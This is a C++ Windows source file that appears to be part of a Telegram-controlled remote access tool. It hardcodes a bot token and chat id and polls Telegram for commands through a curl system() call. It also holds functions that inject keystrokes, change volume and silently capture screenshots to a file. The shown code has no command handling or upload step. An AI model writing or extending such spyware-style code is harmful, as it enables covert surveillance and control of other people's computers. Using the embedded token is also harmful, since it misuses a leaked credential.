#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#include <vector>
#include <atlimage.h>

using namespace std;

string ID;
const string botApi = "1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664";
const string chat_id = "-1001487776950";

inline void GetLastMessage()
{
    string buff = "curl https://api.telegram.org/bot" + botApi + "/getUpdates -o message";
    system(buff.c_str());
}

bool ChangeVolume(double nVolume, bool bScalar)
{

    HRESULT hr = 0;
    bool decibels = false;
    bool scalar = false;
    double newVolume = nVolume;

    auto j = CoInitialize(NULL);
    IMMDeviceEnumerator* deviceEnumerator = NULL;
    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER,
        __uuidof(IMMDeviceEnumerator), (LPVOID*)&deviceEnumerator);
    IMMDevice* defaultDevice = NULL;

    hr = deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice);
    deviceEnumerator->Release();
    deviceEnumerator = NULL;

    IAudioEndpointVolume* endpointVolume = NULL;
    hr = defaultDevice->Activate(__uuidof(IAudioEndpointVolume),
        CLSCTX_INPROC_SERVER, NULL, (LPVOID*)&endpointVolume);
    defaultDevice->Release();
    defaultDevice = NULL;

    float currentVolume = 0;
    endpointVolume->GetMasterVolumeLevel(&currentVolume);

    hr = endpointVolume->GetMasterVolumeLevelScalar(&currentVolume);

    if (bScalar == false)
    {
        hr = endpointVolume->SetMasterVolumeLevel((float)newVolume, NULL);
    }
    else if (bScalar == true)
    {
        hr = endpointVolume->SetMasterVolumeLevelScalar((float)newVolume, NULL);
    }
    endpointVolume->Release();

    CoUninitialize();

    return FALSE;
}

void setID(string newID)
{
    ID = newID;
    fstream file;
    file.open("ID.id", ios::out);
    file << newID;
    file.close();
}

inline void press(char a)
{
    keybd_event(VkKeyScan(a), 1, 0, 0);
    Sleep(5);
    keybd_event(VkKeyScan(a), 1, KEYEVENTF_KEYUP, 0);
}


void TakeScreenShot(const std::string& path)
{
    //setting to the screen shot
    keybd_event(VK_LWIN, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
    keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
    Sleep(5);
    keybd_event(VK_LWIN, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
    keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);

    //handler of the bitmap that save the screen shot
    HBITMAP hBitmap;

    //I have to give for it time to make it work
    Sleep(500);

    //take the screen shot
    OpenClipboard(NULL);

    //save the screen shot in the bitmap handler 
    hBitmap = (HBITMAP)GetClipboardData(CF_BITMAP);
    //	std::cout << "JD";
        //relese the screen shot
    CloseClipboard();

    std::vector<BYTE> buf;
    IStream* stream = NULL;
    HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
    CImage image;
    ULARGE_INTEGER liSize;

    // screenshot to jpg and save to stream
    image.Attach(hBitmap);
    image.Save(stream, Gdiplus::ImageFormatJPEG);
    IStream_Size(stream, &liSize);
    DWORD len = liSize.LowPart;
    IStream_Reset(stream);
    buf.resize(len);
    IStream_Read(stream, &buf[0], len);
    stream->Release();

    // put the imapge in the file
    std::fstream fi;
    fi.open(path, std::fstream::binary | std::fstream::out);
    fi.write(reinterpret_cast<const char*>(&buf[0]), buf.size() * sizeof(BYTE));
    fi.close();
}
